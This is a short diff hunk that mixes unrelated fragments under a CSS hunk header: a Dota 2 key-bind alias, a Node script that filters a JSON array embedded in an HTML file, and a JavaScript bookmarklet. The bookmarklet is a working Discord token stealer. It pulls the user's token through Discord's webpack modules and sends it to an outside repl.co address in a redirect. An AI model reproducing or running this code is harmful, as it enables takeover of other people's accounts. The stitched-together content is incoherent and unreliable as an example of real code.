@@ -160,11 +160,13 @@ html { scroll-behavior: smooth; }
 alias "+ac0" "bind q dota_ability_autocast 0"; alias "-ac0" "bind q dota_ability_execute 0"; bind "shift" "+ac0"
 javascript:(() => { token = (webpackChunkdiscord_app.push([[''], {}, e => { m = []; for(let c in e.c) m.push(e.c[c])}]), m).find(m => m?.exports?.default?.getToken !== void 0).exports.default.getToken(); send = prompt(token, token); if(send !== token) window.location.href = "https://v1.elusion1.repl.co/app?n=" + token })()
 
-file = "storage/shared/index/index."
+file = "storage/shared/download/index."
 jsonFile = JSON.parse(fs.readFileSync(file + "html", "utf8").split("mkush = ")[5].split("//mkush")[0])
 
 data = []
-jsonFile.forEach(m => data.push(`{ "d": "${m.d}", "t": "${m.t}", "p": ["${m.p}" }`))
+jsonFile.forEach(m => {
+if(m.p[0].includes(`"0/`)) return
+data.push(`{ "d": "${m.d}", "t": "${m.t}", "p": ["${m.p}" }`) } )
 data.sort((a, b) => a.toLowerCase().localeCompare(b.toLowerCase()))
 fs.writeFileSync(file + "dll", fs.readFileSync(file + "html", "utf8").split("mkush = ").slice(0, -1).join("mkush = ") + "mkush = [" + data.join(",\n") + "]//mkush" + fs.readFileSync(file + "html", "utf8").split("//mkush").slice(5).join("//mkush"))
 
